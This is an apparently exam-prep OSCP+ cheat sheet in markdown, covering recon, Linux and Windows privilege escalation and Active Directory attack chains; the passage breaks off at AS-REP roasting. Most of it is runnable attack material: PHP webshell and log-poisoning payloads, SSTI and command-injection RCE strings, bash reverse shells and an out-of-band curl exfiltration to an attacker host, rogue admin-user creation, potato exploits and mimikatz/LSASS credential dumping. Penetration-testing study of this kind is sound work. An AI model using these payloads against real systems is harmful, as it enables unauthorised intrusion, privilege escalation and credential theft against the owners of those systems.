markdown
# OSCP+ Complete Exam Checklist & Attack Chains (2025-26)
> **PEN-200 Current Edition | Exam Format: 3 Standalone Boxes + 1 AD Set (3 machines)**
> **Passing Score: 70/100 pts | AD Set: 40 pts | Standalones: 20 pts each**
> **⚠️ AD Set = ASSUMED BREACH — Credentials provided at exam start**

---

## TABLE OF CONTENTS

1. [Exam Structure & Strategy](#1-exam-structure--strategy)
2. [Universal Enumeration Framework](#2-universal-enumeration-framework)
3. [Standalone Linux Box Methodology](#3-standalone-linux-box-methodology)
4. [Standalone Windows Box Methodology](#4-standalone-windows-box-methodology)
5. [Active Directory Attack Chains](#5-active-directory-attack-chains)
6. [MSSQL — RCE & Lateral Movement](#6-mssql--rce--lateral-movement)
7. [Pivoting & Tunneling](#7-pivoting--tunneling)
8. [Password Attacks](#8-password-attacks)
9. [File Transfer Cheatsheet](#9-file-transfer-cheatsheet)
10. [Shells & Upgrades](#10-shells--upgrades)
11. [Exploit Development (BOF Reference)](#11-exploit-development-bof-reference)
12. [Common CVEs & Exploits](#12-common-cves--exploits)
13. [Exam Day Tips](#13-exam-day-tips)
14. [Proof Collection Checklist](#14-proof-collection-checklist)
15. [Quick Reference Card](#15-quick-reference-card)

---

## 1. EXAM STRUCTURE & STRATEGY

### Point Breakdown
```
AD Set (3 machines):       40 pts total
  ├─ MS01 (entry point):   10 pts → local.txt  [PROVIDED CREDS = foothold here]
  ├─ MS02 (pivot target):  10 pts → local.txt  [reached via MS01]
  └─ DC01 (domain admin):  20 pts → proof.txt  [requires DA / SYSTEM]

Standalone Box 1:          20 pts (local.txt = 10 + proof.txt = 10)
Standalone Box 2:          20 pts (local.txt = 10 + proof.txt = 10)
Standalone Box 3:          20 pts (local.txt = 10 + proof.txt = 10)

TOTAL:                     100 pts | PASS: ≥ 70 pts
```

> **AD Assumed Breach = Exam gives you credentials like:**
> `Username: stephanie / Password: Password123 / Domain: corp.local / DC IP: 192.168.x.x`
> You start already inside the network as a low-priv domain user.
> Your job: enumerate → escalate → lateral move → DA → DC

### Time Strategy (23h 45min)

```
Hour 0-0:30   Setup: VPN, loot dirs, /etc/hosts, nmap all targets in parallel
Hour 0:30-4:  ATTACK AD SET FIRST — 40 pts guaranteed path
              ├── Enumerate with provided creds (BloodHound, CME, LDAP)
              ├── Low-hanging fruit: Kerberoast, AS-REP, descriptions, shares
              ├── Lateral MS01 → MS02 → DC
              └── Screenshot every proof immediately
Hour 4-8:     Standalone Box 1 (pick easiest from nmap results)
Hour 8-13:    Standalone Box 2
Hour 13-18:   Standalone Box 3
Hour 18-22:   Revisit stuck machines with fresh eyes
Hour 22-23:   Final screenshots, verify all proofs readable, report notes
```

### Minimum Pass Scenarios

```
Scenario A (Recommended): Full AD (40) + 2 full standalones (40)          = 80 ✓
Scenario B:                Full AD (40) + 1 full (20) + 1 partial (10)    = 70 ✓
Scenario C:                Full AD (40) + 2 local.txt (10+10) + 1 root    = 70 ✓
Scenario D (No AD):        3 full standalones (60) + AD partial (10)       = 70 ✓
Scenario E:                2 full standalones (40) + full AD (40) - 10 err = 70 ✓
```

### Metasploit Rule

```
✓ msfvenom        → use freely for payload generation on ALL machines
✓ Metasploit      → use fully on EXACTLY 1 machine (your choice)
✗ Metasploit      → CANNOT use on more than 1 machine
✓ Manual exploits → use on everything
```

---

## 2. UNIVERSAL ENUMERATION FRAMEWORK

### Initial Recon — Run in Parallel Immediately

```bash
# Step 0: Setup workspace
mkdir -p ~/exam/{ad,box1,box2,box3}/{scans,loot,exploits,screenshots}
# Add all IPs to /etc/hosts as you discover hostnames

# Parallel quick scans on ALL targets at once:
for ip in <MS01_IP> <MS02_IP> <DC_IP> <BOX1_IP> <BOX2_IP> <BOX3_IP>; do
    nmap -sV --open -T4 $ip -oN ~/exam/scans/quick_$ip.txt &
done
wait

# Full TCP per machine (run while you work):
nmap -p- -sV -sC --open -T4 <TARGET_IP> -oN full_tcp.txt

# UDP top 20 — DON'T SKIP (SNMP/TFTP/DNS often critical):
nmap -sU --top-ports 20 <TARGET_IP> -oN udp.txt
```

### Port → Action Decision Tree

```
PORT    SERVICE     → IMMEDIATE ACTION
────────────────────────────────────────────────────────────────
21      FTP         → ftp <IP> (try anonymous:anonymous)
                      check banner version → searchsploit
22      SSH         → note version; use creds found later
                      id_rsa files? ssh -i key user@<IP>
23      Telnet      → telnet <IP>; try default creds
25      SMTP        → smtp-user-enum -M VRFY -U users.txt -t <IP>
                      check open relay; sendmail exploits
53      DNS         → dig axfr @<IP> <domain>
                      dnsrecon -d <domain> -t axfr
80/443  HTTP/S      → [SEE WEB ENUMERATION BELOW]
88      Kerberos    → AD confirmed! AS-REP roast immediately
111     RPC/NFS     → showmount -e <IP>; mount + explore
135     MSRPC       → Windows; rpcclient -U "" -N <IP>
139/445 SMB         → [SEE SMB ENUMERATION BELOW]
161     SNMP UDP    → snmpwalk -c public -v1 <IP>
                      onesixtyone -c community.txt <IP>
389/636 LDAP        → ldapsearch anonymous; AD enumeration
1433    MSSQL       → [SEE MSSQL SECTION 6]
3306    MySQL       → mysql -u root -h <IP> (blank/default pass)
3389    RDP         → check ms17-010, bluekeep; use creds later
4444+   Custom      → nc <IP> <PORT>; banner grab; searchsploit
5985    WinRM       → evil-winrm -i <IP> -u user -p pass
8080    Alt-HTTP    → Tomcat? Jenkins? Weblogic? check /manager
8443    Alt-HTTPS   → same as above; check SSL cert for hostnames
```

### Web Enumeration Workflow

```bash
# 1. Tech fingerprint + headers
whatweb http://<TARGET_IP> -v
curl -I http://<TARGET_IP>
nikto -h http://<TARGET_IP> -output nikto.txt &

# 2. Directory brute force (run both for coverage)
gobuster dir -u http://<TARGET_IP> \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
    -x php,html,txt,asp,aspx,jsp,do,py -t 50 -o gobuster.txt

feroxbuster -u http://<TARGET_IP> \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,html,txt,aspx -t 100 --depth 3 -o ferox.txt

# 3. Always manually check:
curl http://<TARGET_IP>/robots.txt
curl http://<TARGET_IP>/.git/HEAD         # Git repo exposed?
curl http://<TARGET_IP>/.env              # Credentials?
curl http://<TARGET_IP>/backup/           # Backup files?
curl http://<TARGET_IP>/config.php        # DB creds?
curl http://<TARGET_IP>/.htaccess
view-source:http://<TARGET_IP>/           # HTML comments with creds!

# 4. VHost/subdomain enumeration (when domain name known):
gobuster vhost -u http://<DOMAIN> \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain -t 50 -o vhosts.txt
# Add discovered vhosts to /etc/hosts

# 5. CMS-specific:
wpscan --url http://<TARGET_IP> --enumerate u,p,t,cb,dbe --plugins-detection aggressive
joomscan -u http://<TARGET_IP>
droopescan scan drupal -u http://<TARGET_IP>

# 6. Parameter fuzzing:
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -u "http://<TARGET_IP>/page.php?FUZZ=test" -fs 0 -mc 200,301,302,500
```

### SMB Enumeration

```bash
# Unauthenticated checks:
smbclient -L //<TARGET_IP> -N
smbmap -H <TARGET_IP> -u '' -p ''
crackmapexec smb <TARGET_IP> -u '' -p '' --shares
crackmapexec smb <TARGET_IP> -u 'guest' -p '' --shares

# Vulnerability scan:
nmap --script smb-vuln* -p 445 <TARGET_IP>
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

# Authenticated enumeration:
crackmapexec smb <TARGET_IP> -u user -p pass --shares --users --groups --pass-pol
smbmap -H <TARGET_IP> -u user -p pass -R           # Recursive listing
smbclient //<TARGET_IP>/share -U 'user%pass'

# Download all files recursively:
smbclient //<TARGET_IP>/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'

# Spider shares for juicy files:
crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus
```

### SNMP Enumeration

```bash
# Community string brute:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>

# Walk with found community string:
snmpwalk -c public -v1 <TARGET_IP>
snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2   # Installed software
snmpwalk -c public -v2c <TARGET_IP> 1.3.6.1.4.1.77.1.2.25    # Windows users

# Parse output nicely:
snmp-check <TARGET_IP> -c public
```

---

## 3. STANDALONE LINUX BOX METHODOLOGY

### Decision Tree — Linux Initial Access

```
NMAP OUTPUT ANALYSIS
│
├── Web Port (80/443/8080)?
│   ├── Directory enum → /admin, /backup, /upload, /dev found?
│   ├── CMS? → WPScan/Joomscan → plugin CVE / auth bypass
│   ├── Login page? → default creds, SQLi, brute force
│   ├── File upload? → bypass → webshell
│   ├── LFI/RFI? → log poison → RCE
│   ├── SSTI? → Jinja2/Twig RCE
│   ├── SQLi? → file write → webshell
│   ├── Command injection in params?
│   └── Version-specific CVE? → searchsploit
│
├── FTP (21)?
│   ├── Anonymous login → look for writable dir overlapping with webroot
│   └── Upload PHP shell → trigger via browser
│
├── SSH (22)? → need creds; check other services first
│
├── NFS (111/2049)?
│   └── showmount -e → mount → look for .ssh, creds, writable dirs
│
└── SNMP (161 UDP)?
    └── community string → dump info → find creds/usernames
```

### Linux Web Attack Techniques

```bash
# ── LFI ──────────────────────────────────────────────────────
# Basic traversal:
/page.php?file=../../../../etc/passwd
/page.php?file=../../../../etc/shadow    # if lucky
/page.php?file=/proc/self/environ        # environment vars

# PHP wrappers:
/page.php?file=php://filter/convert.base64-encode/resource=config.php
# Decode: echo '<BASE64_OUTPUT>' | base64 -d

# RCE via data wrapper:
/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Log Poisoning → RCE (LFI + writable log):
# Step 1: Inject PHP into Apache/Nginx access log via User-Agent:
curl -A '<?php system($_GET["cmd"]); ?>' http://<TARGET_IP>/
# Step 2: Include log file:
/page.php?file=/var/log/apache2/access.log&cmd=id
# Other log paths: /var/log/auth.log, /var/log/vsftpd.log, /proc/self/fd/1

# SSH log poisoning:
ssh '<?php system($_GET["cmd"]); ?>'@<TARGET_IP>
/page.php?file=/var/log/auth.log&cmd=whoami

# ── SQL Injection ─────────────────────────────────────────────
# Manual test: ' OR '1'='1'-- -
# UNION-based read:
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
# File write (needs FILE privilege + writable webroot):
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/cmd.php'-- -

# sqlmap:
sqlmap -u "http://<TARGET_IP>/login.php" --data="user=admin&pass=x" \
    --level=5 --risk=3 --dbs
sqlmap -u "http://<TARGET_IP>/item?id=1" --os-shell   # Try for direct shell
sqlmap -u "http://<TARGET_IP>/item?id=1" \
    --file-write=/tmp/shell.php \
    --file-dest=/var/www/html/shell.php

# ── File Upload Bypass ────────────────────────────────────────
# 1. MIME type: Change Content-Type to image/jpeg
# 2. Magic bytes prepend: GIF89a
# 3. Double extension: shell.php.jpg, shell.php%00.jpg
# 4. Case variation: shell.pHp, shell.PHP
# 5. Alt extensions: .php3, .php4, .php5, .phtml, .phar, .shtml
# 6. Blacklist bypass: .php7, .inc
# 7. Null byte (older): shell.php%00.gif

# ── SSTI ─────────────────────────────────────────────────────
# Detection (enter in text fields, URL params, headers):
{{7*7}}       → 49 = Jinja2/Twig
${7*7}        → 49 = FreeMarker/Mako
<%= 7*7 %>    → 49 = ERB (Ruby)
#{7*7}        → 49 = Ruby/Pebble

# Jinja2 RCE payloads:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Reverse shell:
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"').read()}}

# Twig RCE:
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ── Command Injection ─────────────────────────────────────────
# Test chars: ; | || && & ` $() \n %0a
ping=127.0.0.1; whoami
ping=127.0.0.1|whoami
ping=127.0.0.1`whoami`
# URL encoded semicolon: %3B
# Blind injection (OOB):
ping=127.0.0.1; curl http://<LHOST>/?x=$(id|base64)
```

### Linux Privilege Escalation Checklist

```bash
# ═══════════════════════════════════════════════════════════
# STEP 1 — AUTOMATED (always run immediately after shell)
# ═══════════════════════════════════════════════════════════
# Host linpeas on attacker:
python3 -m http.server 80

# Run on victim:
curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.out
# Read output: look for RED/YELLOW highlights first

# ═══════════════════════════════════════════════════════════
# STEP 2 — MANUAL CHECKS (don't skip even after linpeas)
# ═══════════════════════════════════════════════════════════

# ── Context ──────────────────────────────────────────────────
whoami && id && hostname
uname -a && cat /etc/os-release
env | grep -i "pass\|key\|secret\|token"
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# ── Sudo ─────────────────────────────────────────────────────
sudo -l
# NOPASSWD results → check GTFObins immediately
# Common escalations:
#   sudo find . -exec /bin/bash \; -p
#   sudo python3 -c 'import os; os.system("/bin/bash")'
#   sudo vim → :!/bin/bash
#   sudo awk 'BEGIN {system("/bin/bash")}'
#   sudo env /bin/bash
#   sudo nmap --interactive → !sh (old nmap)
#   sudo /bin/bash  (if bash listed)
# env_keep+=LD_PRELOAD:
#   gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
#   sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>

# ── SUID/GUID ────────────────────────────────────────────────
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
find / -perm -2000 -type f 2>/dev/null | xargs ls -la
# Each result → check GTFObins (https://gtfobins.github.io/)
# Custom SUID? → strings <binary> → PATH hijack? → ltrace/strace

# ── Capabilities ────────────────────────────────────────────
getcap -r / 2>/dev/null
# cap_setuid+ep  → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# cap_net_bind   → bind port < 1024
# cap_dac_read_search → read any file (tar exploit)
# /usr/bin/python3 = cap_setuid → instant root

# ── Cron Jobs ────────────────────────────────────────────────
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null
# Look for:
# - Root-owned cron running writable script → add revshell to script
# - Wildcard in cron (tar/rsync) → wildcard injection
# - Relative path binary in root cron → PATH hijack

# Wildcard injection example (tar):
# Cron: tar czf backup.tar.gz /var/www/html/*
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=bash shell.sh'
echo 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1' > shell.sh

# ── Services running as root ─────────────────────────────────
ps aux | grep root | grep -v "\[" | grep -v "kthreadd"
ss -tlnp   # local-only services (only accessible from victim)
# Internal service → port forward to attacker → exploit

# ── Writable files ──────────────────────────────────────────
find / -writable -not -path "/proc/*" -not -path "/sys/*" \
    -not -path "/dev/*" -type f 2>/dev/null

# /etc/passwd writable → add root user:
openssl passwd -1 haxpass      # generates hash
echo 'hax:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax   # password: haxpass

# /etc/shadow readable → hashcat/john

# ── NFS no_root_squash ──────────────────────────────────────
cat /etc/exports
# If: /share *(rw,no_root_squash) → 
# On attacker (as root):
mkdir /mnt/nfs
mount -t nfs <TARGET_IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/
chmod +s /mnt/nfs/bash     # set SUID as root
# On victim:
/tmp/bash -p               # spawns root shell

# ── Docker ──────────────────────────────────────────────────
id | grep -i docker
groups | grep -i docker
# If in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ── PATH Hijacking ──────────────────────────────────────────
# Find scripts run as root calling relative paths:
strings /usr/local/sbin/rootscript | grep -v "/"
# If finds "service" without full path:
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<LHOST>/4444 0>&1' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Trigger the root script

# ── Interesting Files ────────────────────────────────────────
find / -name "*.conf" -o -name "*.config" -o -name "*.xml" \
    -o -name "*.ini" -o -name "*.bak" -o -name "*.old" \
    -o -name "*.zip" -o -name "*.db" -o -name "*.kdbx" \
    2>/dev/null | grep -v proc | grep -v sys | head -50

grep -r "password\|passwd\|pwd\|secret\|token\|key" \
    /var/www/html/ /opt/ /home/ /etc/ 2>/dev/null | grep -v ".pyc"

find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# ── Kernel Exploits (LAST RESORT) ────────────────────────────
uname -r
searchsploit linux kernel $(uname -r | cut -d- -f1)
# DirtyCow:   CVE-2016-5195 (kernel < 4.8.3)
# Dirty Pipe: CVE-2022-0847 (kernel 5.8–5.16.11)
# PwnKit:     CVE-2021-4034 (all distros, pkexec)
```

### Linux PrivEsc Decision Tree

```
sudo -l → any NOPASSWD?
    └── GTFObins → ROOT ✓

SUID binary found?
    ├── Known binary in GTFObins → ROOT ✓
    ├── Custom binary → strings/ltrace → PATH hijack?
    └── Relative path call → inject malicious binary → ROOT ✓

Capabilities found?
    └── cap_setuid → setuid(0) → ROOT ✓

Cron writable script?
    └── Append reverse shell → ROOT ✓

Cron wildcard (tar/rsync)?
    └── Wildcard injection → ROOT ✓

/etc/passwd writable?
    └── Add root user → ROOT ✓

NFS no_root_squash?
    └── Mount + SUID bash → ROOT ✓

Docker group?
    └── docker run -v /:/mnt → chroot → ROOT ✓

Internal service (ss -tlnp) as root?
    └── Port forward → exploit locally → ROOT ✓

Nothing? → Kernel exploit (check exact version)
```

---

## 4. STANDALONE WINDOWS BOX METHODOLOGY

### Decision Tree — Windows Initial Access

```
NMAP OUTPUT
│
├── SMB (445)?
│   ├── null session → shares → interesting files → creds
│   ├── MS17-010 vulnerable? → EternalBlue → SYSTEM
│   └── Guest/found creds → PSExec/WMIexec
│
├── Web (80/443/8080)?
│   ├── Same as Linux web attacks
│   ├── IIS? → check /aspnet_client, WebDAV
│   └── Tomcat? → /manager/html → deploy WAR shell
│
├── MSSQL (1433)?
│   └── [SEE SECTION 6 — FULL MSSQL CHAIN]
│
├── WinRM (5985)?
│   └── evil-winrm -i <TARGET_IP> -u user -p pass
│
├── RDP (3389)?
│   ├── BlueKeep (Win7/2008)?
│   └── Use found creds: rdesktop / xfreerdp
│
└── FTP (21)?
    └── anonymous + writable + webroot overlap → upload ASPX shell
```

### Windows Initial Access Commands

```bash
# EternalBlue MS17-010:
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
python3 ms17_010_shellcode.py <TARGET_IP>    # manual
# msf: use exploit/windows/smb/ms17_010_eternalblue (if your 1 allowed Metasploit machine)

# Tomcat Manager WAR deploy:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
curl -u admin:admin -T shell.war "http://<TARGET_IP>:8080/manager/text/deploy?path=/shell"
curl http://<TARGET_IP>:8080/shell/

# WebDAV:
davtest -url http://<TARGET_IP>
cadaver http://<TARGET_IP>
# Upload ASPX:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
curl -T shell.aspx http://<TARGET_IP>/uploads/shell.aspx

# WinRM with password:
evil-winrm -i <TARGET_IP> -u Administrator -p 'Password123'
# WinRM with hash:
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
```

### Windows Privilege Escalation Checklist

```powershell
# ═══════════════════════════════════════════════════════════
# STEP 1 — AUTOMATED
# ═══════════════════════════════════════════════════════════
# Host on attacker:
python3 -m http.server 80

# Run WinPEAS:
powershell -c "Invoke-WebRequest http://<LHOST>/winPEASany.exe -OutFile C:\Windows\Temp\wp.exe"
C:\Windows\Temp\wp.exe > C:\Windows\Temp\out.txt 2>&1
type C:\Windows\Temp\out.txt

# PowerUp:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks"

# ═══════════════════════════════════════════════════════════
# STEP 2 — MANUAL CHECKS
# ═══════════════════════════════════════════════════════════

# ── Context ─────────────────────────────────────────────────
whoami /all          # Full token + privileges — READ THIS CAREFULLY
systeminfo           # OS version, hotfixes → patch level
wmic qfe list brief  # Installed KB patches

# ── Token Privileges (check whoami /priv) ────────────────────
# SeImpersonatePrivilege  → GodPotato/PrintSpoofer/JuicyPotato → SYSTEM
# SeAssignPrimaryToken    → GodPotato/JuicyPotato → SYSTEM
# SeBackupPrivilege       → read any file (SAM/NTDS) → dump hashes
# SeRestorePrivilege      → write any file → DLL hijack
# SeTakeOwnershipPrivilege→ take ownership of any file
# SeDebugPrivilege        → dump LSASS → hashes
# SeLoadDriverPrivilege   → load malicious driver → SYSTEM

# SeImpersonate/SeAssignPrimaryToken:
.\GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\proof.txt"
.\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add && net localgroup administrators hax /add"
.\PrintSpoofer64.exe -i -c "cmd /c whoami"
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd"
# JuicyPotatoNG (newer systems):
.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc.exe" -a "<LHOST> 4444 -e cmd"

# SeBackupPrivilege → read SAM:
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Transfer to attacker → secretsdump:
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# ── Services ────────────────────────────────────────────────
# Unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
# If: C:\Program Files\Some App\service.exe
# Can write: C:\Program.exe → runs as SYSTEM

# Writable service binary:
accesschk.exe -uwcqv * /accepteula 2>nul | findstr "RW\|WD"
# If writable:
sc stop <SERVICE_NAME>
copy shell.exe "C:\path\to\service.exe"
sc start <SERVICE_NAME>

# Weak service permissions:
accesschk.exe -uwcqv "<USERNAME>" * /accepteula
sc config <SERVICE_NAME> binpath= "cmd /c net user hax Pass123! /add"
sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>
sc config <SERVICE_NAME> binpath= "cmd /c net localgroup administrators hax /add"
sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>

# ── Registry ────────────────────────────────────────────────
# AlwaysInstallElevated (check BOTH keys):
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 0x1 → exploit:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi

# Autologon credentials:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# Look for DefaultUserName, DefaultPassword, DefaultDomainName

# Passwords in registry:
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
reg query HKCU /f password /t REG_SZ /s 2>nul

# ── Scheduled Tasks ─────────────────────────────────────────
schtasks /query /fo LIST /v | findstr /i "run as\|task name\|next run\|program"
# Find SYSTEM tasks with writable binary path → replace binary

# ── Stored Credentials ──────────────────────────────────────
cmdkey /list
# Found stored creds → runas:
runas /savecred /user:<DOMAIN>\<USER> "cmd.exe /c whoami > C:\Temp\w.txt"
runas /savecred /user:Administrator "C:\Temp\nc.exe <LHOST> 4444 -e cmd"

# ── DLL Hijacking ───────────────────────────────────────────
# Find processes with missing DLLs (use Procmon or:)
# Look for DLLs in writable directories loaded by privileged processes
# Check PATH directories for writability:
$env:PATH -split ";" | % { if (Test-Path $_) { (Get-Acl $_).Access } }

# ── Interesting Files ────────────────────────────────────────
# PowerShell history (GOLD MINE):
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Web configs:
type C:\inetpub\wwwroot\web.config
type C:\xampp\passwords.txt
type C:\xampp\apache\conf\httpd.conf

# Common credential locations:
dir /s /b C:\*.txt C:\*.xml C:\*.conf C:\*.config C:\*.ini 2>nul | findstr /i "pass cred secret"
dir /s /b C:\Users\ 2>nul | findstr /i "password\|creds\|credentials\|secret"

# Unattended install files:
type C:\Windows\Panther\unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\system32\sysprep.inf
```

### Dump Credentials (Windows Post-Exploitation)

```bash
# On-machine mimikatz:
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords       # cleartext + NTLM
sekurlsa::wdigest              # cleartext (older systems)
lsadump::sam                   # local SAM hashes
lsadump::lsa /patch            # LSA secrets
lsadump::cache                 # cached domain creds

# LSASS dump (AV evasion — no mimikatz binary needed):
# Task Manager → lsass.exe → Create dump file → transfer → parse on attacker
# Or:
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# Parse on attacker:
pypykatz lsa minidump lsass.dmp

# Remote SAM dump (from attacker with admin creds):
secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
secretsdump.py -hashes <LM_HASH>:<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
netexec smb <TARGET_IP> -u user -p pass --sam
netexec smb <TARGET_IP> -u user -p pass -M lsassy
```

### Windows PrivEsc Decision Tree

```
whoami /priv → SeImpersonatePrivilege or SeAssignPrimaryToken?
    └── GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM ✓

whoami /priv → SeBackupPrivilege?
    └── reg save SAM+SYSTEM → secretsdump → hashes → PTH → SYSTEM ✓

AlwaysInstallElevated (both keys = 1)?
    └── msiexec malicious.msi → SYSTEM ✓

Unquoted service path + writable intermediate dir?
    └── Place binary in unquoted path → restart service → SYSTEM ✓

Writable service binary or weak service perms?
    └── Replace/modify → restart → SYSTEM ✓

cmdkey stored credentials?
    └── runas /savecred → higher priv shell ✓

Autologon password in registry?
    └── Reuse credentials elsewhere ✓

Scheduled task running as SYSTEM with writable script?
    └── Modify script → wait/trigger → SYSTEM ✓

PowerShell history contains passwords?
    └── Reuse credentials → PTH / direct access ✓

Nothing works? → check systeminfo patches → unpatched CVE
```

---

## 5. ACTIVE DIRECTORY ATTACK CHAINS

> ### ⚠️ CRITICAL: OSCP AD SET IS ASSUMED BREACH
> The exam provides you with **valid domain credentials** at the start.
> Example provided info:
> ```
> Domain:    CORP.LOCAL
> DC IP:     192.168.x.100
> MS01 IP:   192.168.x.101  (your entry machine — you get shell here)
> MS02 IP:   10.10.10.50    (internal — must pivot from MS01)
> Username:  stephanie
> Password:  Password123
> ```
> You are NOT starting blind. You already have valid creds.
> **Start enumerating AD immediately with these credentials.**

### AD Attack Chain — Full Flow

```
PROVIDED CREDS (stephanie:Password123)
        │
        ▼
Phase 1: RAPID AD ENUMERATION
    BloodHound + CME + PowerView
        │
        ▼
Phase 2: QUICK WINS (do ALL simultaneously)
    ├── AS-REP Roasting
    ├── Kerberoasting  
    ├── Password in descriptions
    ├── SMB share hunting
    └── GPP/SYSVOL passwords
        │
        ▼
Phase 3: FOOTHOLD ON MS01 (local.txt = 10 pts)
    Use found creds / exploit to get shell + privesc to SYSTEM/admin
        │
        ▼
Phase 4: PIVOT TO MS02 (local.txt = 10 pts)
    Setup tunnel → lateral move with found creds/hashes
        │
        ▼
Phase 5: ESCALATE TO DOMAIN ADMIN
    ACL abuse / DCSync / Delegation / GPO abuse
        │
        ▼
Phase 6: OWN DC (proof.txt = 20 pts)
    PSExec/WMIexec as DA → dump NTDS → Golden Ticket
```

### Phase 1: AD Enumeration with Provided Creds

```bash
# ── BloodHound Collection (FIRST THING TO RUN) ──────────────
# From attacker Linux:
bloodhound-python -u stephanie -p 'Password123' \
    -d corp.local -ns 192.168.x.100 -c All --zip
# Import ZIP into BloodHound GUI → run these queries:
# → "Find Shortest Paths to Domain Admins"
# → "Find All Kerberoastable Users"
# → "Find AS-REP Roastable Users"
# → "Computers with Unconstrained Delegation"
# → "Find Principals with DCSync Rights"

# After getting shell on MS01, run SharpHound from inside:
.\SharpHound.exe -c All --domain corp.local --zipfilename bh.zip
# Transfer ZIP to attacker → import

# ── CME Domain Recon ────────────────────────────────────────
crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' \
    --shares --users --groups --pass-pol
netexec smb 192.168.x.100 -u stephanie -p 'Password123' \
    --users --rid-brute

# ── LDAP Enumeration ────────────────────────────────────────
ldapsearch -x -H ldap://192.168.x.100 \
    -D "stephanie@corp.local" -w 'Password123' \
    -b "DC=corp,DC=local" "(objectClass=user)" \
    sAMAccountName description memberOf

# Find users with passwords in description field (VERY COMMON in OSCP):
ldapsearch -x -H ldap://192.168.x.100 \
    -D "stephanie@corp.local" -w 'Password123' \
    -b "DC=corp,DC=local" \
    "(&(objectClass=user)(description=*))" sAMAccountName description

# ── PowerView (from Windows victim) ─────────────────────────
. .\PowerView.ps1
# or:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1')"

Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description}
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainComputer | select name,operatingsystem,dnshostname
Get-DomainGPO | select displayname,gpcfilesyspath
Get-DomainTrust
Find-DomainShare -CheckShareAccess | select name,path
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | \
    ? {$_.ActiveDirectoryRights -match "Write|All|Force"}
```

### Phase 2: Credential Attacks (Quick Wins)

#### AS-REP Roasting

```bash
# From attacker (with provided creds — authenticated):
